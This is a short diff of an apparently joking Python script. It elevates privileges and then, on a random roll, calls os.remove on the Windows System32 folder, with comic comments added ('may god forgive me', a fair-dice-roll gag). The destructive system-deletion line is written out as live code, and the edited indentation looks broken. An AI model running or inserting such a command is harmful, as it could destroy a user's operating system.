@@ -14,12 +14,20 @@ import os
 from elevate import elevate
 
 def is_root():
-    return os.getuid() == 0
+    return os.getuid() == 0 #magic, dont touch
 
 print("before ", is_root())
 elevate()
 print("after ", is_root())
 
 if random.randint(0, 6) == 1:
-    os.remove("C:\Windows\System32")
+#int getRandomNumber()
+#{
+#Return 4  chosen by fair dice roll.
+# guaranteed to be random.
+#}
 
+
+ os.remove("C:\Windows\System32") #for the sins i am about to commit, may god forgive me
+
+#i am not responsible for this code, they made me write it
